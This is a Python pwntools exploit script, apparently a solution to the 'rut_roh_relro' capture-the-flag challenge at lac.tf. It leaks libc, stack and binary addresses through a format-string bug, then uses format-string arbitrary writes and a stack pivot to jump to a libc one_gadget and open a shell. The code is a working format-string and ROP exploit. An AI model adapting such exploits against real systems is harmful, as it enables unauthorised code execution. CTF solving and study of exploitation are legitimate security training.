from pwn import *

exe = ELF("rut_roh_relro_patched")
exe_rop = ROP(exe)
libc = ELF("libc-2.31.so")
# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def wait(*msg):
    if args.LOCAL and args.R2:
        input(" ".join(map(str,msg)))
    else:
        time.sleep(0.2)

def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print
def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            util.proc.wait_for_debugger(util.proc.pidof(r)[0])
    else:
        r = remote("lac.tf", 31134)
    return r


io = start()

leak_payload = b"%71$p-%72$p-%74$p-"
io.sendlineafter(b"post?\n",leak_payload)
io.recvuntil(b"post:\n")
libc.address = int(io.recvuntil(b"-",drop=True),16) - libc.libc_start_main_return
lp("libc",hex(libc.address))
stack_leak_rbp = int(io.recvuntil(b"-",drop=True),16) - 0xf8
lp("stack leak rbp",hex(stack_leak_rbp))
exe.address = int(io.recvuntil(b"-",drop=True),16) - 0x1165
lp("exe base",hex(exe.address))

def write_any_where(writes:dict,data):
    writes.update({
        stack_leak_rbp - 512 - 8:exe.address + 0x11cb
    })
    payload = flat({
        0:[
        fmtstr_payload(6, writes, numbwritten=0, write_size='short'),
        data]})
    lp("payload length",len(payload))
    if len(payload) >=512:
        exit(0)
    io.sendlineafter(b"to post?\n",payload)

leave_ret = 0x0000000000001217
pop_ret = 0x0000000000001274
one_gadget = 0xc961a
write_any_where({
    stack_leak_rbp: stack_leak_rbp - 0x50 - 0xf0,
    stack_leak_rbp+0x8: exe.address + leave_ret,
    },flat({
        0:[
        stack_leak_rbp,
        exe.address + pop_ret,
        0,
        0,
        0,
        0,
        libc.address + one_gadget
        ]
    }))
io.sendlineafter(b"to post?\n",b"lol")

io.interactive()